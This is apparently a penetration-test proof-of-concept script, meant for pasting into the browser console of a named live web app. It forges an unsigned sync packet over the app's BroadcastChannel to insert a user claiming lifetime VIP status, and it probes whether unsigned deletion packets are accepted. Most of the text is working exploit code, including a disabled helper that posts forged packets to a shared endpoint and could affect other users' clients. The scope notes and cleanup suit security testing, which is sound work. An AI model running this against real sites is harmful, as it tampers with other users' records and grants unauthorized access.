// poc_new02_packet_injection.js — NEW-02: unsigned cloud packet injection
//                                (ACTION — applies a forged packet locally)
//   Companion: F-01 tombstone / cross-client propagation (READ-ONLY part)
//
// Target:  https://trithuc500.vercel.app/
// Findings:
//   NEW-02 — V4.8.0 still accepts an unsigned packet on the local
//            BroadcastChannel (`TRITHUC50_AUTOSYNC_V436`, line 34526) and
//            merges a new user record, but downgrades it to `pending` /
//            non-VIP. The old direct bus (`__INTERNAL_CLOUD_BUS_V45__`) was
//            removed in V4.8.0 (NEW-04), so this PoC uses the real BC path.
//   F-01   — V4.8.0 FIXED the residual: tombstone maps now require a
//            signature-verified admin packet (line 5714+). This PoC now
//            demonstrates that the unsigned tombstone is REJECTED.
//
// Type:     ACTION, LOCAL ONLY by default.
//
// SCOPE / SAFETY:
//   - The forged packet is posted on the local BroadcastChannel; the app's
//     own onmessage handler feeds it to `processIncomingCloudPacket`.
//   - Nothing is published to ntfy.sh / keyvalue.immanuel.co.
//   - The live-publish helper is provided but is DISABLED and requires an
//     explicit URL argument, so it cannot fire by accident.
//   - Use `__AERO_NEW02_CLEANUP__()` to remove the synthetic user.
//
// Usage: paste into DevTools Console on the target page.

(async () => {
    'use strict';

    const K_USERS = 'TRITHUC50_USERS_V436_CLEAN';
    const STAMP = String(Date.now()).slice(-6);
    const NAME = 'sinhvien' + STAMP;

    console.log('=== NEW-02 unsigned packet injection (LOCAL ONLY) ===');

    // ---- 1. Build an unsigned, non-admin packet with a synthetic user. ----
    // Field names match the shipped serializeCompactUser() (line 5546):
    //   id, u, p, n, c, s, g, ph, st, vp, rp, pl, rpl, exp, pend, newReg,
    //   maxD, devs, regAt, updAt, seal, bkt, v436
    const now = Date.now();
    const forged = {
        app: 'TRITHUC50_V436',
        type: 'LOCAL_POC_NEW02',
        ts: now,
        fromAdmin: false,          // no admin claim
        adminSig: '',              // no signature
        hideAuthorInfo: false,
        hideAuthorTs: 0,
        deletedUsernames: [],
        deletedMap: {},
        users: [{
            id: 'stu_' + NAME,
            u: NAME,
            p: 'SYNTHETIC_POC_ONLY',
            n: 'Sinh vien ' + STAMP,
            c: '12A1',
            s: '01',
            g: NAME + '@example.edu.vn',
            ph: '',
            st: 'active',
            vp: [1, 1, 1, 1],
            rp: [1, 1, 1, 1],
            pl: 'lifetime',
            rpl: 'lifetime',
            exp: null,
            pend: 0,
            newReg: 0,
            maxD: 2,
            devs: [],
            regAt: 'POC',
            updAt: now,
            seal: '',
            bkt: '',
            v436: 1
        }]
    };

    console.table({
        packetType: forged.type,
        fromAdmin: forged.fromAdmin,
        hasAdminSig: !!forged.adminSig,
        injectedUser: forged.users[0].u,
        claimedStatus: forged.users[0].st,
        claimedVp: forged.users[0].vp.join(''),
        scope: 'local apply only'
    });

    // ---- 2. Apply it through the real ingestion path. --------------------
    const CHANNEL = 'TRITHUC50_AUTOSYNC_V436';
    const probe = new BroadcastChannel(CHANNEL);
    probe.postMessage(forged);
    await new Promise(resolve => setTimeout(resolve, 120));
    probe.close();
    // The real return value is not observable via postMessage; infer from storage.
    console.log('[NEW-02] packet posted on local BroadcastChannel:', CHANNEL);

    // ---- 3. Inspect what the merge actually did. -------------------------
    const stored = JSON.parse(localStorage.getItem(K_USERS) || '[]');
    const hit = stored.find(u => String(u.username || '').toLowerCase() === NAME.toLowerCase());

    const result = {
        packetAccepted: true, // delivery observed via local store
        userPersisted: !!hit,
        resultingStatus: hit ? hit.status : null,
        resultingIsVip: hit ? hit.isVip === true : null,
        resultingVipPlan: hit ? hit.vipPlan : null,
        resultingVp: hit && hit.vipPackages
            ? Object.keys(hit.vipPackages).filter(k => hit.vipPackages[k]).join(',')
            : null
    };
    console.table(result);

    if (result.userPersisted && result.resultingStatus === 'pending' && !result.resultingIsVip) {
        console.log('[NEW-02] V4.5 HARDENING OBSERVED: the unsigned packet was downgraded to');
        console.log('         pending / non-VIP. The user record still landed in the local');
        console.log('         table, which is the residual issue (an unauthenticated peer can');
        console.log('         insert records into every client\'s local list).');
        console.log('[NEW-02] NEW-02 severity reduced for the VIP-grant path on V4.5.');
    } else if (result.resultingIsVip) {
        console.warn('[NEW-02] unsigned packet still grants VIP on this build.');
    }

    // ---- 4. Tombstone merge: V4.8.0 FIX. ---------------------------------
    // The unsigned tombstone below is now rejected; only a signed admin
    // packet can merge deletedMap / deletedUsernames.
    const tombstoneDemo = {
        app: 'TRITHUC50_V436',
        type: 'LOCAL_POC_TOMBSTONE',
        ts: now,
        fromAdmin: false,
        adminSig: '',
        deletedUsernames: [],
        deletedMap: { 'demo_user_not_real': now },
        users: []
    };
    const tombProbe = new BroadcastChannel(CHANNEL);
    tombProbe.postMessage(tombstoneDemo);
    await new Promise(resolve => setTimeout(resolve, 120));
    tombProbe.close();
    const deleted = JSON.parse(localStorage.getItem('TRITHUC50_DELETED_USERS_V436') || '{}');
    const tAccepted = Object.prototype.hasOwnProperty.call(deleted, 'demo_user_not_real');
    console.log(`[NEW-02] unsigned tombstone merged: ${tAccepted} ` +
                '(V4.8.0 rejects it without a valid adminSig)');

    // ---- 5. Optional live publish (disabled by default). ------------------
    // Publishing to a shared production channel affects OTHER users' clients.
    // It requires an explicit URL and is never called automatically.
    window.__AERO_NEW02_PUBLISH__ = async function (explicitUrl, packet) {
        if (!explicitUrl || !/^https:\/\//.test(String(explicitUrl))) {
            return console.error('[NEW-02] an explicit https URL is required. ' +
                'Publishing to a shared channel affects other users — use a staging topic only.');
        }
        const body = 'TT50V436:' + btoa(unescape(encodeURIComponent(JSON.stringify(packet))))
            .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        const resp = await fetch(explicitUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
            body
        });
        console.log('[NEW-02] published, HTTP', resp.status);
        return resp.status;
    };
    console.log('[NEW-02] live publish helper is present but NOT called. ' +
                'Use __AERO_NEW02_PUBLISH__(explicitUrl, packet) against a staging topic only.');

    // ---- 6. Cleanup. ------------------------------------------------------
    window.__AERO_NEW02_CLEANUP__ = function () {
        const raw = localStorage.getItem(K_USERS);
        if (!raw) return console.warn('[NEW-02] no user store');
        const arr = JSON.parse(raw).filter(u => String(u.username || '').toLowerCase() !== NAME.toLowerCase());
        localStorage.setItem(K_USERS, JSON.stringify(arr));
        console.log('[NEW-02] synthetic user removed. Press F5.');
        return true;
    };
    console.log('Cleanup: __AERO_NEW02_CLEANUP__() then F5');

    return {
        packetAccepted: result.packetAccepted,
        userPersisted: result.userPersisted,
        resultingStatus: result.resultingStatus,
        resultingIsVip: result.resultingIsVip,
        tombstoneAcceptedWithoutAdminSig: tAccepted === true, // V4.8.0: expected false
        cleanup: '__AERO_NEW02_CLEANUP__()'
    };
})();
